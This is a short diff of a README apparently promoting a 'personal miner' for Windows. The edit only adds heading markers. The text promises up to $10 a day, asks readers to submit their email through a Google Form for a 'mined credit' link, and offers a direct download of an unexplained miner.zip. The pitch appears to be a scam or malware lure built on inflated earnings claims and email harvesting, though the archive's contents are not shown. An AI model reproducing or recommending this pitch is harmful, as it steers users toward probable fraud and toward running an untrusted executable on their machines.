@@ -2,13 +2,13 @@
 
 ## Easy 360° personal miner Setup!
 
-Just enter your email adress and u can start mining! You will automatically receive a link with your mined credit!
+##Just enter your email adress and u can start mining! You will automatically receive a link with your mined credit!
 
 ### [Easy Miner Setup](https://forms.gle/mGWaMyMEmXay1c6v7)
 
 Install it on any Windows Desktop u want!
 
-Depending on your performance, you can mine up to $ 10 a day! No extra fees!
+## Depending on your performance, you can mine up to $ 10 a day! No extra fees!
 You can get Amazon Credit or Paysafe Card Credit if u dont want to exchange your mined credits! :)
 
 ### [Direct Download](https://github.com/oneclick-miner/miner/blob/master/miner.zip)
